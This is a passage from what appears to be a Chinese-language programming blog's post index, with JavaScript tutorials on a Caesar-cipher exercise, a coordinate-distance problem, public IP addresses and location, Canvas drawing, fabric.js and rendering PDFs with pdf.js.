開始 m = (m % 122) + 96 } // 轉回文字 result += String.fromCharCode(m) } return result} 這裡如果沒有注意的話會不小心把 while(m &gt; 122) 寫成 if(m &gt; 122)。 這樣是不對的，因為當 n 的值大於 26 時，(m % 122) + 96 的值就會超過 122，舉個例子： 1234567// 假設 n 為 27let code = 122let m = code + 27if(m &gt; 122) { m = (m % 122) + 96}console.log(m) // 123 所以一定要用 while 來處理，才能確保 m 一定落在 97 ~ 122 這個範圍。 解法一 取餘數大法這一個解法如果想通後會覺得很直覺。 首先，你知道英文字母總共只有 26 個，接著你再想想下面這兩個案例： 如果往右位移 26 次，是不是就等於沒有動？ 如果往右移 27 次，是不是就等同往右移 1 次？ 從這兩個案例中應該能發現一些事情吧？ 沒錯，我們只要把「位移量 % 26」，就可以求出實際要位移的次數。 所以其實只要把第一種解法稍微修改一下就好了： 12345678910111213141516171819202122232425function solve(lines) { // 位移量 const n = lines[0] * 1 // 原字串 const str = lines[1] console.log(caesarCipher2(str, n))}function caesarCipher2(s, n) { let result = '' for(let i=0; i&lt;s.length; i++) { // 取得 ASCII CODE const code = s.charCodeAt(i) // code + 實際的位移量 let m = code + (n % 26) // 如果超出範圍 if(m &gt; 122) { // 取餘數，並加上 96，因為 a 從 97 開始 m = (m % 122) + 96 } // 轉回文字 result += String.fromCharCode(m) } return result} 可以注意到 while 變成了 if。 這是因為現在的 n 絕對不會超過 26 這個範圍，也就是說 (m % 122) + 96 值絕對不會超過 122，所以這個動作只要做一次就夠了。 雖然不知道這解法對實際效能的影響如何，但能拿掉迴圈看了就是舒服！","link":"/2021/12/28/caesar-cipher/"},{"title":"平面距離計算","text":"來自 LIOJ 上的題目，這一題最難的地方在於「讀取資料」的方式，所以想記錄下來。 大方向 總共有幾組座標資料（每組有 4 個值） 怎麼取得想要的資料 總共有幾組座標資料可以從 lines[0] 得知迴圈要跑幾圈，所以最外層的結構會是： 123for(let i=0; i&lt;Number(lines[0]); i++) { ...} 怎麼取得想要的資料接著就是最麻煩的地方了，要怎麼在每一圈裡面去取得對應的 4 個座標？ 關於這點你可以先做個假設，把每一圈你希望取得的資料寫出來： 12345678910111213141516171819i=0 // 第一組lines[1]lines[2]lines[3]lines[4]i=1 // 第二組lines[5]lines[6]lines[7]lines[8]i=2 // 第三組lines[9]lines[10]lines[11]lines[12]... 可以先注意到，每一圈都會固定是 4 筆資料，所以只要專注在第一個 lines 的值就好，其他的可以用 +1 +2 +3 的方式來取得，所以： i=0 的時候，第一個 lines 值要是 1 i=1 的時候，第一個 lines 值要是 5 i=2 的時候，第一個 lines 值要是 9 接著這部分可以參考 印出星星（金字塔） 裡面提到的方法，用「數學函數」的方式來求出公式： 123f(i) = f(0) = 1f(i) = f(1) = 5f(i) = f(2) = 9 從這裡可以發現規律是 「每一圈都會增加 4」，也就是說，每一圈都要 x4： 1234f(i) = i * 4f(0) = 0f(1) = 4f(2) = 8 當寫到這裡後你應該也能發現，只要在 +1 就可以實現我們的目標： 1234f(i) = i * 4 + 1f(0) = 1f(1) = 5f(2) = 9 如果真的沒有頭緒，那妳可以用最笨的方法，就是一個一個試： 1234567891011121314151617181920212223242526272829303132f(i) = i * 1f(0) = 0f(1) = 1f(2) = 2f(i) = i * 2f(0) = 0f(1) = 2f(2) = 4f(i) = i * 3f(0) = 0f(1) = 3f(2) = 6// 在這邊的時候，你就會發現只要每一項在 + 1 就能符合規律f(i) = i * 4 + 1f(0) = 0 + 1 =&gt; 1f(1) = 4 + 1 =&gt; 5f(2) = 5 + 1 =&gt; 9// 這邊雖然看起來可以把第三項 -1，但是第一個 0 跟第二個 5 的部分會不符合，所以沒有辦法f(i) = i * 5f(0) = 0f(1) = 5f(2) = 10// 之後就更不可能了，所以不會再往下做f(i) = i * 6f(0) = 0f(1) = 6f(2) = 12 所以最後求出的公式就是 i * 4 + 1。 解題在求出規律後，要解出這題就不困難了，所以這裡直接附上原始碼： 1234567891011121314151617181920212223function solve(lines) { // 轉成數字 const arr = lines.map(value =&gt; value * 1) // 總共有幾組 const total = arr[0] // from 0 to 1 for(let i=0; i&lt;total; i++) { // i=0，start=1 // i=1，start=5 // i=2，start=9 const start = i*4 + 1 const x1 = arr[start] * 1 // lines[1] const y1 = arr[start+1] * 1 // lines[2] const x2 = arr[start+2] * 1 // lines[3] const y2 = arr[start+3] * 1 // lines[4] console.log(calculateDistance(x1, y1, x2, y2)) // 1.41 } }function calculateDistance(x1, y1, x2, y2) { const x = (x1-x2) ** 2 const y = (y1-y2) ** 2 return Math.sqrt(x + y).toFixed(2)} Bonus 我原本的解法我原本的想法比較單純，我希望： calculateDistance 會接收一個陣列當作參數，並計算距離 建立一個巢狀陣列，裡面儲存每一組的座標陣列，例如說 [[1, 1, 2, 2], [3, 3, 4, 4]] 遍歷巢狀陣列，把一組陣列都丟給 calculateDistance 計算出距離 簡單來說大概就是這樣的架構： 1234const nestedArray = [[1, 1, 2, 2], [3, 3, 4, 4]]for(let i=0; i&lt;nestedArray; i++) { console.log(calculateDistance(nestedArray[i]))} 所以只要實作出一個可以把 [1, 1, 2, 2, 3, 3, 4, 4] 轉成巢狀陣列的 function 就可以了。 這裡就不細說怎麼實作，直接參考原始碼中的註解裡應該就能理解： 123456789101112131415161718192021function createNestedArray(arr, unit=4) { // 拷貝原陣列 const copyArr = [...arr] // 儲存最後的結果 const result = [] // 建立群組 while(copyArr.length !== 0) { // 暫存陣列 const tempArr = [] // unit 是多少就會推多少個元素到 tempArr // ( 預設是 4 個 ) for(let i=0; i&lt;unit; i++) { tempArr.push(copyArr[i]) } // 推回群組陣列 result.push(tempArr) // 更新陣列內容 copyArr.splice(0, unit) } return result} 最後只要把整個架構組合起來就完成了，這裡一樣附上原始碼： 12345678910111213141516171819202122232425262728293031323334353637383940414243function solve(lines) { // 轉成數字 const temp = lines.map(value =&gt; value * 1) // 移除第一個元素 temp.splice(0,1) // 建立群組陣列 =&gt; [[1, 1, 2, 2], [3, 3, 4, 4]] const group = createNestedArray(temp) // 計算每一組的距離 for(let i=0; i&lt;group.length; i++) { console.log(calculateDistance(group[i])) }}function createNestedArray(arr, unit=4) { // 拷貝原陣列 const copyArr = [...arr] // 儲存最後的結果 const result = [] // 建立群組 while(copyArr.length !== 0) { // 暫存陣列 const tempArr = [] // 儲存元素 for(let i=0; i&lt;unit; i++) { tempArr.push(copyArr[i]) } // 推回群組陣列 result.push(tempArr) // 更新陣列內容 copyArr.splice(0, unit) } return result}function calculateDistance(arr) { // x 軸 const x = (arr[0]-arr[2]) ** 2 // y 軸 const y = (arr[1]-arr[3]) ** 2 // 開根號，取小數第二位 const result = Math.sqrt(x+y).toFixed(2) // 回傳結果 return result} Bonus 更簡潔的寫法只要找出規律，並搭配陣列的內建函式以及解構賦值，可以寫得超簡潔： 1234567891011121314151617181920212223242526function solve(lines) { // 轉成數字 const temp = lines.map(value =&gt; value * 1) // 全部有幾組 const total = temp[0] // 計算每一組的距離 for(let i=0; i&lt;total; i++) { // i=0 =&gt; start=1 // i=1 =&gt; start=5 // i=2 =&gt; start=9 // ... let start = i*4+1 // i=0 =&gt; slice(1, 5) [1, 1, 2, 2] // i=1 =&gt; slice(5, 9) [3, 3, 4, 4] // ... // 搭配解構賦值取出每一點 const [x1, y1, x2, y2] = temp.slice(start, start+4) const distance = calculateDistance(x1, y1, x2, y2) console.log(distance) }}function calculateDistance(x1, y1, x2, y2) { const x = Math.pow(x1-x2, 2) const y = Math.pow(y1-y2, 2) return Math.sqrt(x+y).toFixed(2)}","link":"/2021/12/28/calculate-distance/"},{"title":"知道實體 IP 的話可以知道我的位置嗎？","text":"我原本也蠻好奇這問題的。 簡述雖然在 關於 IP 地址 這篇文章裡有說過一般家裡的網路是採用「浮動 IP 地址」，但同時也會有一個「對外公開的 IP（實體 IP）」。 那麼，當別人知道查到這個 IP 後，是不是就能知道我的位置呢？ 答案是「不會」。這邊解釋一下原因： 因為實體 IP 的位置其實是電信公司（ISP）的機房位置 你實際在連網路的流程是這樣： 先連到我家 Wifi 從我家 Wifi 連到電信公司 最後再從電信公司機房連出去 https://google.com 所以只有電信公司可以找出 IP 對應的 User 是誰，駭客沒辦法（除非他駭入電信公司）。","link":"/2022/03/09/can-someone-get-my-position-by-ip/"},{"title":"Canvas－基本繪製與輸出圖片","text":"一直都沒機會用到的 Canvas。 相關 methods通用： fillRect 畫出實心矩形 strokeRect 畫空心矩形 clearRect 清除畫面 通常會搭配一起使用的： beginPath 開啟新的繪圖路徑 moveTo 初始位置 lineTo 結束位置 stroke 畫出線條軌跡 closePath 關閉繪圖路徑 地雷：同樣是 width / height，但 HTML 和 CSS 的意義不同在使用 Canvas 時可能會想要設定畫布的寬跟高，所以可能會很直覺的用 CSS 來設定，不過這樣的寫法跟直接寫在 HTML 屬性上的意義不一樣，直接來看個範例： 123456789101112&lt;canvas id=\"canvas1\" width=\"50\" height=\"100\"&gt;&lt;/canvas&gt;&lt;canvas id=\"canvas2\" width=\"50\" height=\"100\" style=\"width: 100px\"&gt;&lt;/canvas&gt;&lt;script&gt; ctx1 = canvas1.getContext('2d') ctx2 = canvas2.getContext('2d') ctx1.fillStyle = 'dodgerblue' ctx2.fillStyle = 'dodgerblue' // 在兩個 canvas 中都畫上同樣大小的方塊 ctx1.fillRect(10, 10, 30, 30) ctx2.fillRect(10, 10, 30, 30)&lt;/script&gt; 注意這兩個 canvas 的內容幾乎一樣，只在差 canvas2 多在 CSS 中設定了 width: 100px，最後出來的結果如下： 附註：Codepen 看到差異了嗎？canvas2 的藍色方塊直接被放大了一倍。這是因為 HTML 的寬高是用來設定 Canvas 內部的座標和網格系統，而 CSS 則是用來設定實際呈現在畫布上的實際大小。 以上面的例子來說的話，可以想成是 canvas2 在 Canvas 內部的原本大小是 50 x 100，但因為我們用 CSS 設定了 width: 100px，意思就是最後呈現的畫面必須從原本的 50 x 100 變成 100 x 50，也就是 2 倍（100 / 50），所以最後看到的畫面才會看起來放大了兩倍。 而 canvas1 因為沒有設定 CSS，所以預設會自動以 1:1 的方式去呈現畫布中的內容。 基本繪製功能這邊只解釋大概思路，實作的部分就直接看程式碼吧： 建立一個 flag 來表示目前是否在繪圖，藉此來開關路徑的繪製 在畫布中「點擊」時，開啟繪圖狀態（更新 flag） 「移動」游標時，取得座標位置並繪製路徑（只有在繪圖狀態時才執行） 在對應的時機點結束繪製，一個是游標「離開」畫布時，一個是「鬆開」按鍵時 在電腦上必須監聽底下事件： onMouseDown onMouseMove onMouseUp onMouseLeave 在手機上必須監聽底下事件： onTouchStart onTouchMove onTouchCancel onTouchEnd 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677787980function App() { const canvas1 = useRef&lt;HTMLCanvasElement&gt;(null) // flag const isPanting = useRef&lt;boolean&gt;(false) useEffect(() =&gt; { const ctx1 = canvas1.current!.getContext('2d')! // 線條的 config ctx1.lineWidth = 4 ctx1.lineCap = 'round' return () =&gt; { // 處理 React StrictMode 會渲染兩次的問題 ctx1.clearRect(0, 0, canvas.current!.width, canvas.current!.width) } }, []) // 取得游標在畫布中的位置（座標） function getStartCoord(event: React.TouchEvent | React.MouseEvent) { const cavasSize = canvas1.current?.getBoundingClientRect()! const position = { x: 0, y: 0 } // pc / mobile if (event.type === 'mousemove') { position.x = (event as React.MouseEvent).clientX - cavasSize.left position.y = (event as React.MouseEvent).clientY - cavasSize.top } else { position.x = (event as React.TouchEvent).changedTouches[0].clientX - cavasSize.left position.y = (event as React.TouchEvent).changedTouches[0].clientY - cavasSize.top } return position } function onStart() { // 開啟繪圖狀態 isPanting.current = true } function onDrawing(event: React.TouchEvent | React.MouseEvent) { // 因為監聽的是 move，所以要避免在 canvas 範的圍外執行繪製 if (isPanting.current) { const coord = getStartCoord(event) const ctx1 = canvas1.current!.getContext('2d')! ctx1.lineTo(coord.x, coord.y) ctx1.stroke() } } // 結束繪圖 function onFinish() { const ctx1 = canvas1.current!.getContext('2d')! // 記得重新開啟一個新的繪圖路徑，不然會影響到下一次的繪圖（重要!!!） ctx1.beginPath() // 更新 flag isPanting.current = false } return ( &lt;div className='App'&gt; &lt;canvas ref={canvas1} id='canvas' width='500' height='300' onMouseMove={onDrawing} onMouseDown={onStart} onMouseUp={onFinish} onMouseLeave={onFinish} onTouchStart={onStart} onTouchMove={onDrawing} onTouchCancel={onFinish} onTouchEnd={onFinish} &gt;&lt;/canvas&gt; &lt;/div&gt; )} 附註：Codepen 產生圖片Canvas 元素上有一個 toDataURL 的 method，可以用來把目前畫布上的內容轉換成「base64」的格式。如果你對 base64 不陌生的話，應該就會知道它其實可以當作 &lt;img&gt; 的 src 值，這樣就可以顯示圖片了！ 直接來看範例： 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950function App() { const canvas = useRef&lt;HTMLCanvasElement&gt;(null) const [imgSrc, setImgSrc] = useState&lt;string&gt;('') const isPanting = useRef&lt;boolean&gt;(false) // flag // ...略，這邊都跟之前的範例一樣 // 清除畫布 function onClear() { const ctx = canvas.current!.getContext('2d')! ctx.clearRect(0, 0, canvas.current!.width, canvas.current!.width) setImgSrc('') } // 輸出圖片 function onSave() { // 把目前畫布上的內容轉成 base64 格式 const base64 = canvas.current!.toDataURL('image/png') setImgSrc(base64) } return ( &lt;div className='App'&gt; &lt;div className='wrapper'&gt; &lt;canvas ref={canvas} id='canvas' width='500' height='300' onMouseMove={onDrawing} onMouseDown={onStart} onMouseUp={onFinish} onMouseLeave={onFinish} onTouchStart={onStart} onTouchMove={onDrawing} onTouchCancel={onFinish} onTouchEnd={onFinish} &gt;&lt;/canvas&gt; &lt;div className='img-wrapper'&gt; {/* 有 src 時才顯示圖片 */} {imgSrc !== '' ? &lt;img src={imgSrc} /&gt; : &lt;p&gt;No imgae yet...&lt;/p&gt;} &lt;/div&gt; &lt;/div&gt; &lt;div className='btns'&gt; &lt;button onClick={onClear}&gt;Reset&lt;/button&gt; &lt;button onClick={onSave}&gt;Save&lt;/button&gt; &lt;/div&gt; &lt;/div&gt; )} 附註：Codepen","link":"/2022/11/18/canvas-basic-draw-and-export-image/"},{"title":"Canvas－利用 fabric 打造更好的 Canvas","text":"讓你的 canvas 更靈活。 什麼是 fabric？fabric 是一個 Canvas 的套件，他可以讓 Canvas 中的內容變得更具有互動性，像這樣： 附註：CodePen 這段功能只需要這樣的原始碼就可以實現： 12345678910111213141516171819202122232425function App() { const canvasEl = useRef&lt;HTMLCanvasElement&gt;(null) useEffect(() =&gt; { // 用 fabric new 一個 Canvas 出來 const canvas = new fabric.Canvas(canvasEl.current) // 建立文字元素 const text = new fabric.Text('Hello PeaNu') // 建立圈圈元素 const circle = new fabric.Circle({ fill: 'dodgerblue', radius: 100 }) // 放入 Canvas 中 canvas.add(text, circle) }, []) return ( &lt;div className='App'&gt; &lt;canvas ref={canvasEl} width='500' height='300' style={{ border: '1px solid black' }} &gt;&lt;/canvas&gt; &lt;/div&gt; )} 關於背後的原理其實 fabric 的原理簡單來說就是用一個「新的 canvas 來包住原本的 canvas」，有點像是代理的感覺。當你想對 canvas 做任何操作時，都是先跟 fabric 說，fabric 在幫你做對應的處理。 所以在用 fabric 的時候通常都是我們給他一些資訊（例如：物件），接著 fabric 就會利用這些資訊來對 canvas 做處理。 如果想瞭解更多的話建議閱讀官網上的 Tutorial，裡面能學到大部分的基礎概念。 事件fabric 有提供對應的事件可以監聽，像是常見的點擊，選取都可以透過特定的「名稱」來綁定，這邊介紹幾個比較常用到的： mouse:down 點擊當下觸發（可想成 click） mouse:move 當 hover 的時候觸發 mouse:up 點擊以後觸發（鬆開滑鼠鍵） after:render 渲染完畢後觸發 before:selection:cleared 取消選取之前觸發 selection:cleared 取消選取之後觸發 selection:created 選取後觸發（單個或多個都適用） object:moving 當移動物件時觸發（連續） object:selected 物件被選取時觸發（已棄用） 附註：後來發現這些事件名稱如果是給「物件」用的話，名稱會有一點不同，像 mouse:down 會變成 mousedown，所以如果遇到沒反應的問題，很有可能是你事件名稱寫錯的關係 QQ 附註：只要有 object 這個前綴基本上就是針對 canvas 中的「物件」來做監聽。 來一個簡單的範例： 123456789101112131415161718192021222324function App() { const canvasEl = useRef&lt;HTMLCanvasElement&gt;(null) useEffect(() =&gt; { const canvas = new fabric.Canvas(canvasEl.current) const circle = new fabric.Circle({ fill: 'dodgerblue', radius: 100 }) canvas.add(circle) canvas.on('mouse:down', (option) =&gt; { console.log('event', option.e) console.log('target', option.target) }) }, []) return ( &lt;div className='App'&gt; &lt;canvas ref={canvasEl} width='500' height='300' style={{ border: '1px solid black' }} &gt;&lt;/canvas&gt; &lt;/div&gt; )} 附註：CodePen 當 callback 觸發時會接收一個 option 物件，主要的內容是： option.e 原生的 JS event 物件 option.target 觸發該事件的那個主要物件（通常叫做 Klass） 另外像 object:moving 這種事件也可以綁定在「物件」上，不一定要直接綁在 canvas 實例上，像這樣： 12345678910111213141516171819202122232425function App() { const canvasEl = useRef&lt;HTMLCanvasElement&gt;(null) useEffect(() =&gt; { const canvas = new fabric.Canvas(canvasEl.current) const circle = new fabric.Circle({ fill: 'dodgerblue', radius: 100 }) canvas.add(circle) // 注意這時候是用 moving，而不是 object:moving circle.on('moving', (option) =&gt; { console.log('event', option.e) console.log('target', option.target) }) }, []) return ( &lt;div className='App'&gt; &lt;canvas ref={canvasEl} width='500' height='300' style={{ border: '1px solid black' }} &gt;&lt;/canvas&gt; &lt;/div&gt; )} 附註：CodePen 綜合範例在知道大概有哪些事件可以用之後，就可以做出簡單的清除功能： 這邊的思路還直覺的，就是： 當選取物件時，更新 state 讓 clear 按鈕可以點選 若取消選取，則更新 state 禁用 clear 按鈕 最後按下 clear 按鈕時，透過 getActiveObject 來取得目前被選取的物件並用 remove 來移除 有興趣可以到 Codepen 上參考。 怎麼對 Group 起來後的子元素事件監聽？我當初試過這幾種方法，但都沒效： 直接對子元素設置監聽器（事件會沒效） 想透過 option.e.target 來取得觸發的子元素（只會取到 group） 後來參考了這篇才解決，簡單來說就是要在建立 group 的時候把 subTargetCheck 設為 true，接著事件發生時就可以透過 option.subTargets[0] 來存取該真正的那個目標。 更好用的繪圖功能雖然在之前有實作過如何用原生的 canvas 來實現繪製功能，但用 fabric 可以更輕鬆且畫出更滑順的線條，直接來看範例吧： 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556function App() { const canvasEl = useRef&lt;HTMLCanvasElement&gt;(null) useEffect(() =&gt; { // 用 fabric new 一個 Canvas 出來，並存到 ref canvasEl.current = new fabric.Canvas('orig-canvas') // 建立筆刷 const brush = new fabric.PencilBrush(canvasEl.current) // 筆刷設定 canvasEl.current.freeDrawingBrush = brush canvasEl.current.freeDrawingBrush.width = 5 // 開啟繪圖模式（重要!!!） canvasEl.current.isDrawingMode = true return () =&gt; { // 因為 Strick Mode，所以第一次要先清掉 const data = canvasEl.current.dispose() } }, []) function swicher(type: 'brush' | 'erase') { switch (type) { case 'brush': // 新增筆刷 -&gt; 設定 -&gt; 開啟繪圖模式 const brush = new fabric.PencilBrush(canvasEl.current) canvasEl.current.freeDrawingBrush = brush canvasEl.current.freeDrawingBrush.width = 5 canvasEl.current.isDrawingMode = true break case 'erase': // 新增橡皮擦 -&gt; 設定 -&gt; 開啟繪圖模式 const erase = new fabric.EraserBrush(canvasEl.current) canvasEl.current.freeDrawingBrush = erase canvasEl.current.freeDrawingBrush.width = 10 canvasEl.current.isDrawingMode = true break default: break } } return ( &lt;div className='App'&gt; &lt;div className='options'&gt; &lt;button onClick={() =&gt; swicher('brush')}&gt;Brush&lt;/button&gt; &lt;button onClick={() =&gt; swicher('erase')}&gt;Erase&lt;/button&gt; &lt;/div&gt; &lt;canvas id='orig-canvas' width='500' height='300' style={{ border: '1px solid black' }} &gt;&lt;/canvas&gt; &lt;/div&gt; )} 附註：橡皮擦功能並沒有內建在 fabric 中，必需引入額外的模組才行，詳細可參考官方說明。 這樣就有一個畫畫跟橡皮擦的功能囉！而且用起來更滑順，可以去底下範例去實際玩玩看就能感受到差異了： 原生範例 fabric 範例 實作 PDF 簽名功能這邊只解釋思路，剩下的就麻煩各位看 code 和註解了。 把 PDF 顯示到 canvas 上的流程： 使用者點擊「上傳檔案」時，讀取檔案內容並轉換成 base64 格式 產生一個 canvas 元素，並把轉成 base64 格式的檔案丟給 Pdfjs 處理後塞進去裡面 利用 fabric 把 canvas 元素（那個 PDF）轉成 img 後丟渲染到真正要顯示在畫面上的 canvas 簽名的流程： 使用者點擊「Signature」，彈出 Modal 後把裡面的 canvas 開啟繪圖功能 使用者簽好名後按下「Save」，把簽名的部分利用 fabric 轉換圖片，接著在插入到畫面上那個 canvas 中（顯示 PDF 內容的那個） 這邊會比較亂的地方就是有各種 canvas 和資料轉換的流程，所以可能還是要搭配原始碼來讀會比較好理解一點： 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142function App() { const { isOpen, onOpen, onClose } = useDisclosure() // 顯示 pdf 和簽名區塊的 canvas const canvasPdf = useRef&lt;any&gt;(null) // 顯示簽名區塊的 canvas const canvasSignature = useRef&lt;any&gt;(null) useEffect(() =&gt; { canvasPdf.current = new fabric.Canvas('canvas-pdf') return () =&gt; { canvasPdf.current.dispose() } }, []) function readBlob(blob: Blob): Promise&lt;string&gt; { return new Promise((resolve, reject) =&gt; { const fileReader = new FileReader() fileReader.addEventListener('load', () =&gt; resolve(fileReader.result as string)) fileReader.addEventListener('error', () =&gt; reject('read blob failed')) fileReader.readAsDataURL(blob) }) } async function getPdfCanvas(file: File) { // 把 blob 轉成 base64 格式 const base64 = await readBlob(file) // 記得要去掉檔案 type 的前綴，不然沒有辦法處理 const data = atob(base64.substring(base64Prefix.length)) // 注意是以 Object 來傳入 const pdfDoc = await getDocument({ data }).promise const pdfPage = await pdfDoc.getPage(1) const viewport = pdfPage.getViewport({ scale: window.devicePixelRatio }) // 建立 canvas 元素 const canvasElement = document.createElement('canvas') const context = canvasElement.getContext('2d')! // 設定 canvas 的寬高 canvasElement.height = viewport.height canvasElement.width = viewport.width // 把 pdf 渲染到 canvas 中 await pdfPage.render({ canvasContext: context, viewport }).promise // 把做好的 canvas 回傳 return canvasElement } async function onFileSelect(event: React.ChangeEvent&lt;HTMLInputElement&gt;) { const file = event.target.files![0] // 沒有選擇檔案就跳出 if (!file) return // 把 pdf 變成 canvas 元素 await getPdfCanvas(file).then((element) =&gt; { const scale = 1 / window.devicePixelRatio // 利用 canvas(pdf) 來產生 fabric image 元素 const img = new fabric.Image(element, { scaleX: scale, scaleY: scale }) // 用來更新 canvas 的畫面（重新渲染） canvasPdf.current.requestRenderAll() canvasPdf.current.setWidth(img.width! / window.devicePixelRatio) canvasPdf.current.setHeight(img.height! / window.devicePixelRatio) // 把 pdf 圖片設為 canvas 的背景 canvasPdf.current.setBackgroundImage(img, canvasPdf.current.renderAll.bind(canvasPdf.current)) }) } // 關閉 modal，並把簽名轉成圖片放入顯示 PDF 的 canvas 中 function onSave() { const imgSrc = canvasSignature.current.toDataURL({ format: 'png' }) fabric.Image.fromURL(imgSrc, (img) =&gt; { img.left = 200 img.top = 200 img.scaleX = 0.5 img.scaleY = 0.5 canvasPdf.current.add(img) }) onClose() } // 把畫面上已選取的元素刪除 function onClear() { canvasPdf.current.remove(canvasPdf.current.getActiveObject()) } // 打開用來簽名的 modal function onModal() { onOpen() // modal 剛打開時還抓不到元素，所以才利用 setTimeout 處理（我相信一定有比這更好的寫法，但我目前沒想到） setTimeout(() =&gt; { // 把 modal 中的 canvas 加入繪圖功能 canvasSignature.current = new fabric.Canvas('canvas-signature') const brush = new fabric.PencilBrush(canvasSignature.current) canvasSignature.current.freeDrawingBrush = brush canvasSignature.current.freeDrawingBrush.width = 3 canvasSignature.current.isDrawingMode = true }, 0) } return ( &lt;div className='App'&gt; &lt;input type='file' onChange={onFileSelect} /&gt; &lt;div className='canvas-pdf-wrapper'&gt; &lt;canvas id='canvas-pdf' width='500' height='300' style={{ border: '1px solid black' }} &gt;&lt;/canvas&gt; &lt;/div&gt; &lt;div className='options'&gt; &lt;Button colorScheme='pink' onClick={onClear}&gt; Clear &lt;/Button&gt; &lt;Button colorScheme='teal' onClick={onModal}&gt; Signature &lt;/Button&gt; &lt;/div&gt; &lt;Modal isOpen={isOpen} onClose={onClose} useInert={false}&gt; &lt;ModalOverlay /&gt; &lt;ModalContent&gt; &lt;ModalHeader&gt;Signature&lt;/ModalHeader&gt; &lt;ModalCloseButton /&gt; &lt;ModalBody&gt; &lt;canvas id='canvas-signature'&gt;&lt;/canvas&gt; &lt;/ModalBody&gt; &lt;ModalFooter&gt; &lt;Button colorScheme='pink' onClick={onClose}&gt; Close &lt;/Button&gt; &lt;Button colorScheme='teal' onClick={onSave}&gt; Save &lt;/Button&gt; &lt;/ModalFooter&gt; &lt;/ModalContent&gt; &lt;/Modal&gt; &lt;/div&gt; )} 附註：codesandbox，順道一提這邊因為懶得手刻所以套了一下 chakra。 加上刪除按鈕如果你想要讓每一個物件可以有點 X 來清除的這種功能，可以參考這篇 官方文件。","link":"/2022/11/29/canvas-fabric/"},{"title":"Canvas－渲染 PDF 的方法","text":"講白話一點就是把 PDF 變成 Cavas。 環境配置由於我當初在研究時踩到了一些地雷，所以還是說明一下環境配置的方式。這邊要安裝的套件是 pdf.js。不過因為是用 React 來實作，所以會用 npm 來安裝 pdfjs-dist 這個套件。 裝好套件後，必須再透過 GlobalWorkerOptions 來做配置： 12345import { GlobalWorkerOptions } from 'pdfjs-dist'import pdf from './assets/sample.pdf'const src = 'https://cdn.jsdelivr.net/npm/pdfjs-dist@&lt;your_pack_version&gt;/build/pdf.worker.js'GlobalWorkerOptions.workerSrc = src 請務必把 &lt;your_pack_version&gt; 填入和 pdfjs-dist 相同的版號 請務必把 &lt;your_pack_version&gt; 填入和 pdfjs-dist 相同的版號 請務必把 &lt;your_pack_version&gt; 填入和 pdfjs-dist 相同的版號 如果沒有做這段配置或是你填錯版號，等一下在使用的時候就會出錯，所以請務必先做好這段配置。 讀取本機檔案這段主要是介紹怎麼用套件提供的 methods 來讀取和渲染，要特別注意的是這段期間是「非同步」執行的。 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364// 引入專案中的 pdf 檔import pdf from './assets/sample.pdf'function App() { GlobalWorkerOptions.workerSrc = workerSrc const canvas = useRef&lt;HTMLCanvasElement&gt;(null) useEffect(() =&gt; { renderPDF(pdf, 1).catch((error) =&gt; { console.log('error', error) }) }, []) // 讀取檔案的 function async function renderPDF(src: string, page: number) { const ctx = canvas.current!.getContext('2d')! // 利用 getDocument 來讀取檔案 const doc = await getDocument(src).promise // 拿到檔案後，利用 getPage 來取得頁面資訊 doc.getPage(page).then((page) =&gt; { // 設定縮放比例 const viewport = page.getViewport({ scale: 1 }) // 設定 cavas 的寬高 canvas.current!.width = viewport.width canvas.current!.height = viewport.height // 渲染到 canvas 中 page.render({ canvasContext: ctx, viewport }) }) } return ( &lt;div className='App'&gt; &lt;div className='canvas-wrapper'&gt; &lt;canvas ref={canvas} id='canvas'&gt;&lt;/canvas&gt; &lt;/div&gt; &lt;div className='btns'&gt; &lt;button onClick={() =&gt; { // 切到第一頁 renderPDF(pdf, 1).catch((error) =&gt; { console.log('error', error) }) }} &gt; Prev &lt;/button&gt; &lt;button onClick={() =&gt; { // 切到第二頁 renderPDF(pdf, 2).catch((error) =&gt; { console.log('error', error) }) }} &gt; Next &lt;/button&gt; &lt;/div&gt; &lt;/div&gt; )} 實際範例可以到 codesandbox 上參考，不過我實在不知道為什麼 codesandbox 上沒辦法讀取到 pdfjs 的包…，所以在範例中是透過 cdn 的方式來引入的，這一點還請見諒。 讀取使用者上傳的檔案在多數情況下，我們想做的通常是讓使用者自己上傳檔案並顯示到畫面上。其實主要的邏輯都跟剛剛差不多，就是把檔案內容丟給 pdfjs 來處理並且渲染到 canvas 上，但現在要多做的一件事情是： 先把使用者上傳的檔案做格式轉換後，再丟給 pdfjs 來處理 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354function App() { const canvas = useRef&lt;HTMLCanvasElement&gt;(null) // 讀取檔案的 function async function renderPDF(src: ArrayBuffer, pageIndex: number) { const ctx = canvas.current!.getContext('2d')! // 利用 getDocument 來讀取檔案 const doc = await getDocument(src).promise // 拿到檔案後，利用 getPage 來取得頁面資訊 doc.getPage(pageIndex).then((page) =&gt; { // 設定縮放比例 const viewport = page.getViewport({ scale: 1 }) // 設定 cavas 的寬高 canvas.current!.width = viewport.width canvas.current!.height = viewport.height // 渲染到 canvas 中 const renderTask = page.render({ canvasContext: ctx, viewport }) renderTask.promise.catch(() =&gt; alert('render error')) }) } function onFileSelect(event: React.ChangeEvent&lt;HTMLInputElement&gt;) { const files = event.target.files! // 確認有選擇檔案才做事 if (files.length &gt; 0) { // new 一個 FileReader const fileReader = new FileReader() // 用 FileReader 來讀取 blob fileReader.readAsArrayBuffer(files[0]) fileReader.onload = () =&gt; { // 下面這兩段會在文中解釋，這邊先看個概念就好了 // new 一個 Uint8Array 的 視圖（view）出來 const typedArray = new Uint8Array(fileReader.result as ArrayBuffer) // 把 Uint8Array 丟給 pdfjs 來處理，並渲染到 canvas 上 renderPDF(typedArray, 1).catch((error) =&gt; console.log(error.message)) } } } return ( &lt;div className='App'&gt; &lt;div className='btns'&gt; &lt;input type='file' onChange={onFileSelect} /&gt; &lt;/div&gt; &lt;div className='canvas-wrapper'&gt; &lt;canvas ref={canvas} id='canvas'&gt;&lt;/canvas&gt; &lt;/div&gt; &lt;/div&gt; )} 附註：codesandbox 